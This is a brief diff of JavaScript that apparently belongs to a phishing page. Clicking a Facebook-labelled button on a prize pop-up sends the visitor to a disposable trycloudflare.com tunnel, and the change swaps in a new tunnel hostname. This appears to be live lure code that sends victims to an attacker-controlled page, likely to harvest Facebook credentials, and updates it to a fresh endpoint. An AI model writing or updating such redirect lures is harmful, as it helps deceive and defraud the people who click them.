@@ -72,6 +72,6 @@ document.addEventListener("DOMContentLoaded", () => {
 document.addEventListener("DOMContentLoaded", () => {
     document.getElementById("Facebook-modal").addEventListener("click", () => {
         document.getElementById("modal-premio").style.display = "none";
-        window.location.href = "https://foreign-casual-sam-left.trycloudflare.com";
+        window.location.href = "https://releases-declared-carb-ready.trycloudflare.com";
     });
 });
